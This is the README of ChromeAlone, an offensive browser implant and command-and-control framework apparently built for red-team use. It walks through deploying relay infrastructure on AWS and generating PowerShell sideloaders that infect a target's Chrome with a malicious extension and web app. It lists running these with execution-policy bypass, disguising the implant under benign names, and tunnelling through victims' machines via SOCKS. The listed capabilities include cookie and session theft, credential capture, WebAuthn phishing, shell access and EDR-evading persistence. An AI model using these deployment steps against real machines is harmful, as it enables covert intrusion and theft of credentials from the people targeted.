# ChromeAlone - A Browser C2 Framework

![Architecture Diagram](BATTLEPLAN.png)

# What does this get me?
ChromeAlone is a browser implant that can be used in place of conventional implants like Cobalt Strike or Meterpreter. This repo provides a simple build process that will generate a management console, deploy infrastructure, and create a powershell sideloader script to run on targets. 

After installation, each ChromeAlone implant will provide mechanisms for:

* Providing a SOCKS TCP Proxy on the host
* Browser session stealing and credential capture
* Launching executables on the host from Chrome
* Phishing for WebAuthn requests for physical security tokens like YubiKeys or Titan Security Keys.
* An EDR resistant form of persistence on host that is implemented entirely with Chromium's built-in features.

# Build Instructions

First build the docker container: `docker build -t chromealone .`

## Deployment Instructions

There are currently two supported deployment modes. Note that in either case, you should be running `docker` from the base directory of the ChromeAlone git repository.

### Deployment from scratch via AWS

For this you'll need to have an AWS account configured with your credentials stored in `~/.aws/credentials`. Make sure your account has full EC2 write permissions along with Route53 permissions. Additionally it's assumed that your Route53 has been configured with at least 1 hosting zone containing a registered domain. If these conditions are met, then you can run this command.

```
docker run --rm -v $(pwd):/project -v ~/.aws:/root/.aws chromealone --domain=sendmea.click --appname=UpdateService --region=us-west-2
```

The `domain` value should match a domain under the control of your Route53 setup. `appname` can be whatever value you want, and will be used for naming several registry keys and folders on disk when deploying. It is recommended to use a fairly benign name like `UpdateService` or something equally innocuous.
Note that `region` is optional, and will default to `us-east-2` if not specified.

This will deploy the BATTLEPLAN relay server to AWS and generate the following artifacts:

`output/client` - The control webapp to manage your ChromeAlone installs.

`output/sideloader.ps1` - The installation script to run on targets to infect their local browser instance. NOTE: There will also be an `iwa-sideloader.ps1` file for loading ONLY the Isolated Web App, and 
`extension-sideloader.ps1` for loading ONLY the browser extension.

`output/extension` - The generated malicious browser extension.

`output/iwa` - The generated malicious Isolated Web App signed webapp bundle file.

`output/relay-deployment` - Terraform artifacts from your AWS deployment including an SSH key for directly accessing the host.

### Generate Deployment scripts from an existing server deployment

If you've already deployed an instance, `output/relay-deployment/terraform.tfvars` will contain all the information necessary to generate new sideloader scripts + malicious extensions. You can point the ChromeAlone docker file at the `tfvars` file and it will skip the deployment step while maintaining the appropriate metadata to handle connections.

Run the build script `docker run --rm -v $(pwd):/project -v ~/.aws:/root/.aws chromealone --tfvars=/project/path/to/terraform.tfvars --appname=UpdateService` and it will generate a new malicious sideloader for your deployment.

## Installing on Hosts

Take `sideloader.ps1` and execute it on your target Windows 10 or Windows 11 machine by running `powershell.exe ExecutionPolicy Bypass -File .\path\to\sideloader.ps1`. Note that you can run with additional flags if you would like to install a NativeMessaging host (required for shelling out) or force chrome to restart (necessary if you want your extension to run immediately after running this script versus waiting for the next time the user opens Chrome). An example invocation with both of these flags is `powershell.exe -ExecutionPolicy Bypass .\sideloader.ps1 -InstallNativeMessagingHost $true -ForceRestart $true`. You can also modify the defaults at the top of the script from `false` to `true` if you wish these flags to automatically be used.

A complete script execution will take roughly 20-30 seconds.

# Operator Instructions

Once ChromeAlone is loaded, you can view any connected hosts by opening `output/client/index.html`. This webapp will be pre-configured to connect back to your deployed BATTLEPLAN relay instance. Note that by default, the relay is firewalled to only allow incoming control access on ports 1080-1181 from the IP that deployed the server. If you wish to modify this, you'll need to update the EC2 instance's network settings to include any additional machines.

Most commands can be run from the WebUI including:

* Dumping history + cookies (via the `Quick Commands` section, which requires selecting a target agent in the `Execute Command` section)
* Capturing Credentials (these will appear via the `Captured Data` tab)
* Forcing WebAuthn requests (via the `Execute Command` section)
* File System reads (via the `File Browser` tab)
* Executing Shell commands (via the `Interactive Shell` tab)

The primary exception to this is SOCKS proxying. Each infected host is assigned a unique SOCKS port for the server that can be seen under the `Agent Information` section, where each agent has a `Port` field. The assigned port, when combined with the `admin` credentials stored in `output/client/config.js` can be used to configure a host specific SOCKS proxy.

For example, say we have an agent where the port is 1081, our domain is `chrome.alone`, our username `admin` (this is always the case), and our password is `thisisnotarealpassword`. Here are some example usages:

```
proxychains -q socks5 admin:thisisnotarealpassword@chrome.alone:1081 curl http://ifconfig.me
xfreerdp /cert:ignore /v:<target RDP host> /u:<target RDP username> /proxy:socks5://admin:thisisnotarealpassword@chrome.alone:1081
curl -x socks5h://chrome.alone:1081 -u "admin:thisisnotarealpassword" http://ifconfig.me
```

# What's in this Repository?

The ChromeAlone repository is broken down into components, many of which could be used individually as part of an assessment - but together represent the entire Chromium browser implant toolchain.

* `BATTLEPLAN` - This is the management server component of the toolchain. It contains terraform scripts for deploying to an AWS environment as well as an HTML client for interacting with the server post deployment.
* `BLOWTORCH` - This is a malicious Isolated Web Application which uses `Direct Socket` permissions to implement a SOCKS TCP proxy and websocket server to enable communications between other chrome components. It also acts as the messaging bridge back to the `BATTLEPLAN` relay server.
* `DOORKNOB` - This is a series of scripts used for generating powershell sideloaders for Isolated Web Apps and Chrome Extensions. The script in `build.sh` provides an example of how to create a single Powershell installer script that combines both of theses individual sideloaders into one.
* `HOTWHEELS` - This is a malicious Chrome extension that implements all of its capabilities in Web Assembly. It provides the vast majority of ChromeAlone's feature sets for credential capture, session hijacking, shelling out, and reading the file system.
* `PAINTBUCKET` - A series of content scripts that enable phishing for WebAuthn requests by hiding additional WebAuthn requests within iFrames in inactive tabs whenever a normal WebAuthn request is made.

# Who made this?

This tool has been written by [Mike Weber](https://www.linkedin.com/in/michael-weber-6a466517/) of [Praetorian Security](https://www.praetorian.com/).

# License

ChromeAlone is licensed under the Apache License, Version 2.0.

```
Copyright 2025 Praetorian Security, Inc

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
```
